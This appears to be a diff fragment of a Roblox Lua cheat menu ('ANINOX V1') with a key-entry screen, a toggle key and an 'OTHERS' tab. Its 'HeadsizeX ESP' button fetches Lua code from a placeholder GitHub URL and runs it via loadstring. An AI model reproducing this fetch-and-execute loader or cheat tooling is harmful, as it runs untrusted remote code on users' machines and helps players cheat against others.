+        espBtn.Size = UDim2.new(1,0,0,42)
+        espBtn.Position = UDim2.new(0,0,0,54)
+        espBtn.BackgroundColor3 = Color3.fromRGB(20,20,20)
+        espBtn.TextColor3 = Color3.fromRGB(240,240,240)
+        espBtn.Font = Enum.Font.Gotham
+        espBtn.TextSize = 14
+        espBtn.Text = "HeadsizeX ESP"
+        espBtn.Parent = othersFrame
+        Instance.new("UICorner", espBtn)
+        espBtn.MouseButton1Click:Connect(function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/YourUsername/HeadsizeXESP/main/source.lua"))()
+        end)
+
+        -- OTHERS TITLE
+        local topLabel = Instance.new("TextLabel", tabArea)
+        topLabel.Name = "OthersTitle"
+        topLabel.Size = UDim2.new(1,0,0,28)
+        topLabel.Position = UDim2.new(0,0,0,6)
+        topLabel.BackgroundTransparency = 1
+        topLabel.Text = "OTHERS"
+        topLabel.Font = Enum.Font.GothamBold
+        topLabel.TextSize = 16
+        topLabel.TextColor3 = Color3.fromRGB(255,255,255)
+        topLabel.TextXAlignment = Enum.TextXAlignment.Center
+    end)
+
+    -- TOGGLE MENU
+    UIS.InputBegan:Connect(function(input,chatting)
+        if chatting then return end
+        if unlocked and input.KeyCode == TOGGLE_KEY then
+            mainFrame.Visible = not mainFrame.Visible
+        end
+    end)
+
+    player:GetPropertyChangedSignal("UserId"):Connect(function()
+        avatarImg.Image = "rbxthumb://type=AvatarHeadShot&id="..player.UserId.."&w=420&h=420"
+    end)
+end
+
+-- KEY GUI LOGIC
+local function submitKey()
+    local typed = (keyBox.Text or ""):upper()
+    if typed == CORRECT_KEY then
+        unlocked = true
+        keyBox.Text = ""
+        keyFrame.Visible = false
+        task.defer(loadMainGUI)
+    else
+        keyBox.Text = ""
+        keyBox.PlaceholderText = "BOBO KA!"
+        keyBox.PlaceholderColor3 = Color3.fromRGB(255,80,80)
+        shakeFrame(keyFrame)
+        wrongSound:Play()
+        task.wait(1.2)
+        keyBox.PlaceholderText = "Enter Key"
+        keyBox.PlaceholderColor3 = Color3.fromRGB(130,130,130)
+        wrongSound:Stop()
+    end
+end
+
+enterBtn.MouseButton1Click:Connect(submitKey)
+keyBox.FocusLost:Connect(function(enterPressed)
+    if enterPressed then submitKey() end
+end)
+keyBox.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode == Enum.KeyCode.Return then
+        submitKey()
+    end
+end)
+
+-- INITIAL VISIBILITY
+keyFrame.Visible = true
+
+print("ANINOX V1 GUI loaded with instant key GUI and OTHERS tab.")
